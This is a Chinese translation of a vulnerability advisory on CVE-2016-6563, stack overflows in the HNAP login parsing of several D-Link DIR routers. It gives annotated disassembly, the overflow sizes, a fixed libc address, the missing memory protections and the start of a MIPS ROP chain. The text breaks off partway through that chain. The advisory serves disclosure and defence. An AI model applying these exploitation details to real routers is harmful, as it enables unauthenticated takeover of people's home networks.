# 【漏洞分析】Dlink DIR路由器HNAP登录函数的多个漏洞
|
##### 译文声明
本文是翻译文章，文章来源：githubusercontent
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
**翻译：**[ **Ox9A82**](http://bobao.360.cn/member/contribute?uid=2676915949)
**稿费：180RMB（不服你也来投稿啊！）**
**投稿方式：发送邮件至linwei#360.cn，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿**
**受影响产品的背景**
智能手机，笔记本电脑，平板电脑，手机，智能电视，游戏机等设备都在同一时间进行连接。这就是为什么我们设计了新的AC3200 Ultra Wi-Fi路由器。通过Tri-Band技术，使得速度高达3.2Gbps，它提供了严苛环境下必要的超级性能，使得其成为最好的家庭无线路由器。
**概要**
Dlink路由器在LAN接口上存在一个名为HNAP（家庭网络管理协议）的协议。这是一种允许识别，配置和管理网络设备的SOAP协议。Dlink使用这个协议来实现通过LAN口与路由器的web接口进行通信。有关HNAP的更多信息，请参见[1]和[2]。
Dlink中的HNAP具有悠久的漏洞历史。Craig Heffner似乎发现了大量这种类型的漏洞（见[3]，[4]，[5]，[6]，[7]，[8]）。
当进行HNAP登录操作时，对SOAP消息内的XML标记进行处理时会触发此漏洞。受影响的函数包含两个栈溢出，这可以被未经验证的攻击者通过LAN进行利用。它影响了跨越ARM和MIPS体系结构的多个Dlink路由器。
Metasploit为这两种架构设计的漏洞利用模块已经发布[9]。
特别感谢CERT/CC和Trent Novelly帮助向供应商披露此漏洞。更多的有关信息，请参阅CERT的建议[10]。
**技术细节**
**漏洞类型：** 栈溢出
**CVE编号：** CVE-2016-6563
**攻击向量：** 远程
**约束：** 可以被未经验证的攻击者利用。其他约束，请见下文。
**受影响的版本：** 以下MIPS设备已被确认为易受攻击
DIR-823
DIR-822
DIR-818L(W)
以下ARM设备已被确认为易受攻击
DIR-895L
DIR-890L
DIR-885L
DIR-880L
DIR-868L -> Rev. B and C only
可能存在有上面没有列出的其他受影响的设备。
**漏洞详细信息和MIPS环境的漏洞利用**
漏洞函数为parse_xml_value（这是我自己定义的名字，不是一个符号）被/htdocs/cgibin中的hnap_main（二进制中的符号）所调用。
这个函数有3个参数：第一个是接受的对象/字符串，第二个是在请求内部解析的XML标签名称，第三个是一个指针，指向了应该返回的标签值。
这个函数尝试在请求对象中查找标签名，然后获取标签的值，首先将其复制到本地变量，然后再复制到第三个参数中。此函数在执行HNAP登录操作时被hnap_main调用，用于从上述SOAP请求中获取Action，Username，LoginPassword和Catpcha的值。
    parse_xml_value(char* request, char* XMLtag, char* tag_value)
    (...)
    .text:00412264     xml_tag_value_start = $s2
    .text:00412264     xml_tag_value_end = $s1
    .text:00412264 C30                 addu    xml_tag_value_start, $v0, $s0  # s2 now points to $value
    .text:00412268 C30                 la      $t9, strstr
    .text:0041226C C30                 move    $a1, xml_tag_value_end  # needle
    .text:00412270 C30                 jalr    $t9 ; strstr
    .text:00412274 C30                 move    $a0, xml_tag_value_start  # haystack
    .text:00412278 C30                 lw      $gp, 0xC30+var_C20($sp)
    .text:0041227C C30                 beqz    $v0, loc_4122BC
    .text:00412280 C30                 subu    xml_tag_value_end, $v0, xml_tag_value_start  # s1 now holds the ptr to value$
    .text:00412284 C30                 bltz    xml_tag_value_end, loc_4122BC
    .text:00412288 C30                 addiu   $s0, $sp, 0xC30+xml_tag_var
    .text:0041228C C30                 la      $t9, strncpy
    .text:00412290 C30                 move    $a2, xml_tag_value_end  # n
    .text:00412294 C30                 move    $a1, xml_tag_value_start  # src
    .text:00412298 C30                 addu    xml_tag_value_end, $s0, xml_tag_value_end
    .text:0041229C C30                 jalr    $t9 ; strncpy    # copies all chars in $value$ to xml_tag_var using strncpy
    .text:004122A0 C30                 move    $a0, $s0         # dest
    .text:004122A4 C30                 move    $a0, a2_ptr      # a2_ptr is a stack variable from hnap_main (passed as third argument to parse_xml_value)
    .text:004122A8 C30                 lw      $gp, 0xC30+var_C20($sp)
    .text:004122AC C30                 move    $a1, $s0         # src
    .text:004122B0 C30                 la      $t9, strcpy# copies xml_tag_var into a2_ptr using strcpy
    .text:004122B4 C30                 jalr    $t9 ; strcpy     # the stack of the calling function (hnap_main) is thrashed if 2408+ bytes are sent
    .text:004122B8 C30                 sb      $zero, 0(xml_tag_value_end)
    (...)
由于存在着两个溢出漏洞，因此我们有两个exp开发的选择：
1\.
本地堆栈（在parse_xml_value上）可以被超过3096字节的数据溢出。即使是使用了strncpy这种溢出也会发生，因为strncpy的参数只是对XML标签中的值进行strlen得到的。
2\.
或者，我们可以溢出调用函数（hnap_main）的堆栈，只需使用超过2408字节的数据即可。这是因为strcpy用于将xml_tag_var复制到由parse_xml_value接收的第三个参数，而它是一个指向hnap_main函数栈中局部变量的指针。
通过1. 进行利用要更容易一些，下面的例子将具体解释利用该如何进行。
所有受影响的MIPS设备使用相同版本的uClibc（libuClibc-0.9.30.3.so）并且都将其加载到0x2aabe000地址，这使得固件版本对利用来说并不重要。应该注意的是，MIPS设备使用基于Lextra
RLX5281核心的RTL8881a CPU。Lextra
RLX核心是MIPS的克隆版本，但它有一些缺陷，因为它们缺少一些加载和存储指令。由于这个原因，工作在MIPS上的一些通用shellcode可能无法工作在这些CPU（特别是经过混淆的）上。
这些设备不具有NX，ASLR或任何其他的现代内存保护机制，所以shellcode可以直接在堆栈上执行。但是，有必要通过ROP来设置堆栈以供执行，这可以通过libuClibc-0.9.30.3.so中的gadgets来实现。
由于MIPS
CPU的工作方式，因此有必要在执行exp之前清除CPU的高速缓存。这可以通过调用libc中sleep()函数来强制清除。（参考关于MIPS CPU缓存的解释）。
所以ROP链和shellcode看起来像：
    first_gadget - execute sleep and call second_gadget
    .text:0004EA1C                 move    $t9, $s0 <- sleep()
    .text:0004EA20                 lw      $ra, 0x20+var_4($sp) <- second_gadget
    .text:0004EA24                 li      $a0, 2 <- arg for sleep()
    .text:0004EA28                 lw      $s0, 0x20+var_8($sp)
    .text:0004EA2C                 li      $a1, 1